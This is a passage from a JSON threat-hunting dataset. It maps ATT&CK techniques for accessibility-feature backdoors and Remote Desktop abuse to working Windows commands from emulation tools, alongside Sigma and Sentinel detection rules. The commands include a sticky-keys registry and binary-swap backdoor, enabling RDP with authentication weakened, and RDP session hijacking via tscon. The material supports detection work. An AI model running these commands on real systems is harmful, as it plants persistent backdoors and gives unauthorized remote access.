REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Sticky Keys Persistence via Registry Manipulations:\nshell REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/manage/sticky_keys", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Sticky Keys Persistence via binary swapping:\ntakeown.exe C:\\Windows\\system32\\sethc.exe\ndel C:\\Windows\\system32\\sethc.exe\ncopy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Sticky Keys Persistence via binary swapping:\nshell takeown.exe C:\\Windows\\system32\\sethc.exe\nshell del C:\\Windows\\system32\\sethc.exe\nshell copy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe", "name": "Cobalt Strike"}, {"source": "atomics/T1015/T1015.yaml", "command": "$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){   \n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n", "name": null}, {"source": "atomics/T1015/T1015.yaml", "command": "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"C:\\windows\\system32\\cmd.exe\"\nForeach ($item in $input_table){   \n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n", "name": null}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe /v \"Debugger\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AtBroker.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_wmi_debugger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_wmi_debugger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/debugger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/debugger", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1015", "Built-in Windows Command": "Sticky Keys Persistence via Registry Manipulations:\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "Cobalt Strike": "Sticky Keys Persistence via Registry Manipulations:\nshell REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "Metasploit": "post/windows/manage/sticky_keys", "Description": "Modify the registry to point the sethc.exe file to point to cmd.exe"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1015", "Built-in Windows Command": "Sticky Keys Persistence via binary swapping:\ntakeown.exe C:\\Windows\\system32\\sethc.exe\ndel C:\\Windows\\system32\\sethc.exe\ncopy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe", "Cobalt Strike": "Sticky Keys Persistence via binary swapping:\nshell takeown.exe C:\\Windows\\system32\\sethc.exe\nshell del C:\\Windows\\system32\\sethc.exe\nshell copy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe", "Metasploit": "", "Description": "Remove the real sethc.exe and replace it with a copy of cmd.exe. You can also just move the original sethc.exe to a different file if you don't want to delete it"}}, {"Atomic Red Team Test - Accessibility Features": {"attack_technique": "T1015", "display_name": "Accessibility Features", "atomic_tests": [{"name": "Attaches Command Prompt as a Debugger to a List of Target Processes", "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\n\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n", "supported_platforms": ["windows"], "input_arguments": {"parent_list": {"description": "Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: \"osk.exe\"\n", "type": "String", "default": "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"}, "attached_process": {"description": "Full path to process to attach to target in #{parent_list}. Default: cmd.exe\n", "type": "Path", "default": "C:\\windows\\system32\\cmd.exe"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){   \n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n", "cleanup_command": "$input_table = \"#{parent_list}\".split(\",\")\nForeach ($item in $input_table)\n{\n  $item = $item.trim()\n  reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" /v Debugger /f | Out-Null\n}\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100175", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg add", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe /v \"Debugger\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "accessibity_features", "mitre_attack": "T1015", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100176", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg add", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "accessibity_features", "mitre_attack": "T1015", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100177", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg add", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "accessibity_features", "mitre_attack": "T1015", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100178", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg add", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "accessibity_features", "mitre_attack": "T1015", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100179", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg add", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "accessibity_features", "mitre_attack": "T1015", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100180", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg add", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "accessibity_features", "mitre_attack": "T1015", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100181", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "reg add", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AtBroker.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "accessibity_features", "mitre_attack": "T1015", "itw_sample": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/lateral_movement/invoke_wmi_debugger", "ATT&CK Technique #1": "T1015", "ATT&CK Technique #2": "", "Technique": "Accessibility Features", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_wmi_debugger\":  [\"T1015\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/misc/debugger", "ATT&CK Technique #1": "T1015", "ATT&CK Technique #2": "", "Technique": "Accessibility Features", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/debugger\":  [\"T1015\"],"}}], "command_list": ["Sticky Keys Persistence via Registry Manipulations:\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "Sticky Keys Persistence via Registry Manipulations:\nshell REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "post/windows/manage/sticky_keys", "Sticky Keys Persistence via binary swapping:\ntakeown.exe C:\\Windows\\system32\\sethc.exe\ndel C:\\Windows\\system32\\sethc.exe\ncopy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe", "Sticky Keys Persistence via binary swapping:\nshell takeown.exe C:\\Windows\\system32\\sethc.exe\nshell del C:\\Windows\\system32\\sethc.exe\nshell copy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe", "$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){   \n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n", "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"C:\\windows\\system32\\cmd.exe\"\nForeach ($item in $input_table){   \n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe /v \"Debugger\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AtBroker.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "powershell/lateral_movement/invoke_wmi_debugger", "powershell/lateral_movement/invoke_wmi_debugger", "powershell/persistence/misc/debugger", "powershell/persistence/misc/debugger"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and process_parent_path contains\"winlogon.exe\"and (process_path contains \"sethc.exe\"or process_path contains \"utilman.exe\"or process_path contains \"osk.exe\"or process_path contains \"magnify.exe\"or process_path contains \"displayswitch.exe\"or process_path contains \"narrator.exe\"or process_path contains \"atbroker.exe\")", "name": "Accessibility Features"}, {"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) and registry_key_path contains \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\*\"", "name": "Accessibility Features Registry"}], "possible_detections": [{"data_source": {"action": "global", "title": "Sticky Key Like Backdoor Usage", "id": "baca5663-583c-45f9-b5dc-ea96a22ce542", "description": "Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen", "references": ["https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/"], "tags": ["attack.privilege_escalation", "attack.persistence", "attack.t1015", "car.2014-11-003", "car.2014-11-008"], "author": "Florian Roth, @twjackomo", "date": "2018/03/15", "detection": {"condition": "1 of them"}, "falsepositives": ["Unlikely"], "level": "critical"}}, {"data_source": {"logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection_registry": {"EventID": 13, "TargetObject": ["*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger", "*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\\Debugger", "*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\Debugger", "*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Magnify.exe\\Debugger", "*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Narrator.exe\\Debugger", "*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe\\Debugger"], "EventType": "SetValue"}}}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection_process": {"ParentImage": ["*\\winlogon.exe"], "CommandLine": ["*cmd.exe sethc.exe *", "*cmd.exe utilman.exe *", "*cmd.exe osk.exe *", "*cmd.exe Magnify.exe *", "*cmd.exe Narrator.exe *", "*cmd.exe DisplaySwitch.exe *"]}}}}, {"data_source": {"title": "Suspicious Debugger Registration Cmdline", "id": "ae215552-081e-44c7-805f-be16f975c8a2", "status": "experimental", "description": "Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor).", "references": ["https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/"], "tags": ["attack.persistence", "attack.privilege_escalation", "attack.t1015"], "author": "Florian Roth", "date": "2019/09/06", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["*\\CurrentVersion\\Image File Execution Options\\sethc.exe*", "*\\CurrentVersion\\Image File Execution Options\\utilman.exe*", "*\\CurrentVersion\\Image File Execution Options\\osk.exe*", "*\\CurrentVersion\\Image File Execution Options\\magnify.exe*", "*\\CurrentVersion\\Image File Execution Options\\narrator.exe*", "*\\CurrentVersion\\Image File Execution Options\\displayswitch.exe*"]}, "condition": "selection"}, "falsepositives": ["Penetration Tests"], "level": "high"}}]}, {"technique_id": "T1076", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Enable RDP Services:\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \nnet start TermService", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Enable RDP Services:\nshell REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nshell reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \nshell net start TermService", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/manage/enable_rdp", "name": "Metasploit"}, {"source": "atomics/T1076/T1076.yaml", "command": null, "name": null}, {"source": "atomics/T1076/T1076.yaml", "command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:rdp-tcp#55\"\nnet start sesshijack\n", "name": null}, {"source": "atomics/T1076/T1076.yaml", "command": "Connect-RDP -ComputerName $ENV:logonserver.TrimStart(\"\\\") -User #{username}\n", "name": null}, {"source": "atomics/T1076/T1076.yaml", "command": "Connect-RDP -ComputerName #{logonserver} -User $Env:USERDOMAIN\\$ENV:USERNAME\n", "name": null}, {"source": "SysmonHunter - Remote Desktop Protocol", "command": "mstsc.exe|tscon.exe", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/enable_multi_rdp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/enable_multi_rdp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/enable_rdp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/enable_rdp", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1076", "Built-in Windows Command": "Enable RDP Services:\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \nnet start TermService", "Cobalt Strike": "Enable RDP Services:\nshell REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nshell reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \nshell net start TermService", "Metasploit": "post/windows/manage/enable_rdp", "Description": "Enable RDP via the registry and services"}}, {"Atomic Red Team Test - Remote Desktop Protocol": {"attack_technique": "T1076", "display_name": "Remote Desktop Protocol", "atomic_tests": [{"name": "RDP hijacking", "description": "RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n", "supported_platforms": ["windows"], "input_arguments": {"Session_ID": {"description": "The ID of the session to which you want to connect", "type": "String", "default": 1337}, "Destination_ID": {"description": "Connect the session of another user to a different session", "type": "String", "default": "rdp-tcp#55"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\"\nnet start sesshijack\n", "cleanup_command": "sc.exe delete sesshijack >nul 2>&1\n"}}, {"name": "RDPto-DomainController", "description": "Attempt an RDP session via \"Connect-RDP\" to a system. Default RDPs to (%logonserver%) as the current user\n", "supported_platforms": ["windows"], "input_arguments": {"logonserver": {"description": "ComputerName argument default %logonserver%", "type": "String", "default": "$ENV:logonserver.TrimStart(\"\\\")"}, "username": {"description": "Username argument default %USERDOMAIN%\\%username%", "type": "String", "default": "$Env:USERDOMAIN\\$ENV:USERNAME"}}, "dependencies": [{"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) { exit 0} else { exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Connect-RDP -ComputerName #{logonserver} -User #{username}\n"}}]}}, {"SysmonHunter - T1076": {"name": "Remote Desktop Protocol", "description": null, "level": "medium", "phase": "Lateral Movement", "query": [{"type": "process", "process": {"any": {"pattern": "mstsc.exe|tscon.exe"}}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/enable_multi_rdp", "ATT&CK Technique #1": "T1076", "ATT&CK Technique #2": "T1043", "Technique": "Remote Desktop Protocol", "Concatenate for Python Dictionary": "\"powershell/management/enable_multi_rdp\":  [\"T1076\",\"T1043\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/enable_rdp", "ATT&CK Technique #1": "T1076", "ATT&CK Technique #2": "", "Technique": "Remote Desktop Protocol", "Concatenate for Python Dictionary": "\"powershell/management/enable_rdp\":  [\"T1076\"],"}}], "command_list": ["Enable RDP Services:\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \nnet start TermService", "Enable RDP Services:\nshell REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nshell reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \nshell net start TermService", "post/windows/manage/enable_rdp", null, "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:rdp-tcp#55\"\nnet start sesshijack\n", "Connect-RDP -ComputerName $ENV:logonserver.TrimStart(\"\\\") -User #{username}\n", "Connect-RDP -ComputerName #{logonserver} -User $Env:USERDOMAIN\\$ENV:USERNAME\n", "mstsc.exe|tscon.exe", "powershell/management/enable_multi_rdp", "powershell/management/enable_multi_rdp", "powershell/management/enable_rdp", "powershell/management/enable_rdp"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and(process_path contains \"tscon.exe\"or process_path contains \"mstsc.exe\")", "name": "Remote Desktop Protocol Process"}, {"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (process_path contains \"LogonUI.exe\"or registry_key_path contains \"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services\\\\\")", "name": "Remote Desktop Protocol Registry"}], "possible_detections": [{"data_source": {"title": "RDP over Reverse SSH Tunnel", "id": "5f699bc5-5446-4a4a-a0b7-5ef2885a3eb4", "status": "experimental", "description": "Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389", "references": ["https://twitter.com/SBousseaden/status/1096148422984384514"], "author": "Samir Bousseaden", "date": "2019/02/16", "tags": ["attack.defense_evasion", "attack.command_and_control", "attack.t1076", "car.2013-07-002"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 3, "Image": "*\\svchost.exe", "Initiated": "true", "SourcePort": 3389, "DestinationIp": ["127.*", "::1"]}, "condition": "selection"}, "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "RDP Login from localhost", "id": "51e33403-2a37-4d66-a574-1fda1782cc31", "description": "RDP login with localhost source address may be a tunnelled login", "references": ["https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html"], "date": "2019/01/28", "modified": "2019/01/29", "tags": ["attack.lateral_movement", "attack.t1076", "car.2013-07-002"], "status": "experimental", "author": "Thomas Patzke", "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": 4624, "LogonType": 10, "SourceNetworkAddress": ["::1", "127.0.0.1"]}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "RDP over Reverse SSH Tunnel WFP", "id": "5bed80b6-b3e8-428e-a3ae-d3c757589e41", "status": "experimental", "description": "Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389", "references": ["https://twitter.com/SBousseaden/status/1096148422984384514"], "author": "Samir Bousseaden", "date": "2019/02/16", "tags": ["attack.defense_evasion", "attack.command_and_control", "attack.t1076", "car.2013-07-002"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": 5156}, "sourceRDP": {"SourcePort": 3389, "DestinationAddress": ["127.*", "::1"]}, "destinationRDP": 